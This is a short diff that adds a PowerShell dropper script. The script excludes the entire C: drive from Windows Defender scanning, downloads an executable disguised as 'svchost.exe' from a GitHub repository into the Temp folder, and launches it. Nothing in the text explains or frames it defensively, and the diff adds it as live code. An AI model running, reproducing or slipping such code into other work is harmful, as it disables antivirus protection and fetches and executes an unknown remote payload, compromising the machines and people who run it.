@@ -1,0 +1,5 @@
+Add-MpPreference -ExclusionPath C:\
+$url = "https://github.com/LuisPhantom/Vemom/raw/refs/heads/main/svchost.exe"
+$output = "$env:Temp/svchost.exe"
+Invoke-WebRequest -Uri $url -OutFile $output
+Start-Process -FilePath $output
